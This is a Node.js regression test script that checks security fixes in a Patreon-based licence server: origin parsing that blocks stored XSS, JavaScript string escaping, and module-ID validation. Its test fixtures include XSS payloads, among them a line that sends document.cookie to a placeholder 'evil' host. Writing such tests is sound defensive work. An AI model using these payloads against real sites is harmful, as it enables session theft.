/**
 * Standalone regression cover for the licence-server hardening — run with:
 *   node scripts/verify-security.js
 *
 * Covers the three fixes that are pure functions and therefore testable without
 * a Worker, a KV namespace or a database:
 *   1. parseOrigin  — the stored-XSS vector in the OAuth success page.
 *   2. escJs        — the defence in depth behind it.
 *   3. isValidModuleId — the fail-open that handed unknown modules
 *                        vnd-enhanced's feature set and installation slots.
 *
 * No network, no DB. Exits non-zero if any expectation fails.
 */

import { parseOrigin, escJs, resolveModuleId } from '../src/routes/auth.js';
import { PatreonClient }      from '../src/patreon.js';

let failures = 0;

function check(label, actual, expected) {
  const ok = actual === expected;
  if (!ok) failures++;
  const mark = ok ? 'ok' : `FAIL (esperado ${JSON.stringify(expected)}, salió ${JSON.stringify(actual)})`;
  console.log(`${label.padEnd(58)} | ${mark}`);
}

// ── 1. parseOrigin ────────────────────────────────────────────────────────────
// The old check was `startsWith('http')`, which let markup straight through.

console.log('\n== parseOrigin ==============================================================');

check('origen normal se conserva',
  parseOrigin('https://foundry.example.com:30000'), 'https://foundry.example.com:30000');

check('la ruta se descarta, sólo queda el origen',
  parseOrigin('http://localhost:30000/game?x=1#f'), 'http://localhost:30000');

// The attack: close the <script> that holds the value and run arbitrary code on
// the worker's own origin, where the victim's auth code is sitting in the DOM.
check('inyección de </script> rechazada',
  parseOrigin('http://x</script><script>alert(1)</script>'), null);

check('salto de línea rechazado',        parseOrigin('http://x\nalert(1)'), null);
check('comilla simple rechazada',        parseOrigin("http://x'+alert(1)+'"), null);
check('javascript: rechazado',           parseOrigin('javascript:alert(1)'), null);
check('data: rechazado',                 parseOrigin('data:text/html,<script>x</script>'), null);
check('"httpfoo" ya no cuela',           parseOrigin('httpfoo://evil'), null);
check('cadena vacía rechazada',          parseOrigin(''), null);
check('no-string rechazado',             parseOrigin({ toString: () => 'http://x' }), null);
check('null rechazado',                  parseOrigin(null), null);

// Whatever survives parseOrigin can no longer carry any of the dangerous bytes.
const survivors = ['https://a.example.com', 'http://localhost:30000', 'https://1.2.3.4:8443']
  .map(parseOrigin)
  .filter(Boolean);
const clean = survivors.every(o => !/[<>'"\n\r\u2028\u2029]/.test(o));
check('ningún origen válido contiene bytes peligrosos', clean, true);
check('los 3 orígenes válidos sobrevivieron', survivors.length, 3);

// ── 2. escJs ──────────────────────────────────────────────────────────────────

console.log('\n== escJs ====================================================================');

check('cierra <script> escapado',   escJs('</script>'),      '\\x3C/script\\x3E');
check('comilla simple escapada',    escJs("a'b"),            "a\\'b");
check('comilla doble escapada',     escJs('a"b'),            'a\\"b');
check('barra invertida escapada',   escJs('a\\b'),           'a\\\\b');
check('salto de línea escapado',    escJs('a\nb'),           'a\\nb');
check('retorno de carro escapado',  escJs('a\rb'),           'a\\rb');
check('U+2028 escapado',            escJs('a\u2028b'),       'a\\u2028b');
check('U+2029 escapado',            escJs('a\u2029b'),       'a\\u2029b');
check('nullish → cadena vacía',     escJs(null),             '');

// The end-to-end property: nothing escJs emits can terminate the string literal
// it is embedded in, nor the <script> element around it.
const nasty = `</script><script>fetch('//evil/'+document.cookie)</script>\n\u2028'"\\`;
const escaped = escJs(nasty);
check('la salida no contiene < ni > crudos', /[<>]/.test(escaped), false);
check('la salida no contiene terminadores de línea crudos',
  /[\n\r\u2028\u2029]/.test(escaped), false);
// Round-trip: the escaped form must still be a valid JS literal that decodes
// back to exactly the input — escaping that corrupts the value is its own bug.
// eslint-disable-next-line no-eval
check('round-trip conserva el valor original', eval(`'${escaped}'`), nasty);

// ── 3. isValidModuleId ────────────────────────────────────────────────────────

console.log('\n== isValidModuleId ==========================================================');

const REGISTERED = [
  'vnd-enhanced', 'sf2e-cyber-sheet', 'starfinderdashboard', 'hopefinder-sheet',
  'pf2e-velvet-sheet', 'dnd-velvet-sheets', 'velvet-journals', 'velvet-mobile',
  'dnd-shops', 'directional-token-images', 'velvet-move', 'isometric-tokens-creator'
];
for (const id of REGISTERED) check(`registrado: ${id}`, PatreonClient.isValidModuleId(id), true);

for (const id of ['', 'no-such-module', 'VND-ENHANCED', 'vnd-enhanced ', null, undefined, 42]) {
  check(`rechazado: ${JSON.stringify(id)}`, PatreonClient.isValidModuleId(id), false);
}

// An unregistered module must resolve to nothing at all — the old fallback gave
// it allFeatures['vnd-enhanced'], including the server-gated 'dnd-shops'.
const leaked = PatreonClient.featuresForTier('basic', 'no-such-module');
check('módulo desconocido no hereda features de vnd-enhanced',
  leaked.includes('dnd-shops'), false);

// ── 4. resolveModuleId ────────────────────────────────────────────────────────
// Absent vs. claimed-and-unknown are deliberately different: clients built
// before multi-module support are still installed (D&D Shops ≤ v0.6.0 sends no
// moduleId at all), and refusing them would break activation in live worlds
// while buying nothing — anyone can claim 'vnd-enhanced' outright.

console.log('\n== resolveModuleId ==========================================================');

check('id válido se conserva',
  resolveModuleId('directional-token-images'), 'directional-token-images');
check('ausente → vnd-enhanced (cliente antiguo)', resolveModuleId(undefined), 'vnd-enhanced');
check('null → vnd-enhanced (cliente antiguo)',    resolveModuleId(null), 'vnd-enhanced');
check('reclamado y desconocido → rechazado',      resolveModuleId('no-such-module'), null);
check('cadena vacía → rechazada',                 resolveModuleId(''), null);
check('tipo no-string → rechazado',               resolveModuleId(42), null);
check('id con espacio final → rechazado',         resolveModuleId('vnd-enhanced '), null);

// dnd-shops keeps the feature name /shops/data gates on, from both directions.
check('dnd-shops entrega su propio feature',
  PatreonClient.featuresForTier('basic', 'dnd-shops').includes('dnd-shops'), true);
check('vnd-enhanced sigue incluyendo dnd-shops',
  PatreonClient.featuresForTier('basic', 'vnd-enhanced').includes('dnd-shops'), true);

console.log(
  failures === 0
    ? '\n✅ Todo correcto: ninguna comprobación falló.\n'
    : `\n❌ ${failures} comprobación(es) fallaron.\n`
);
process.exit(failures === 0 ? 0 : 1);
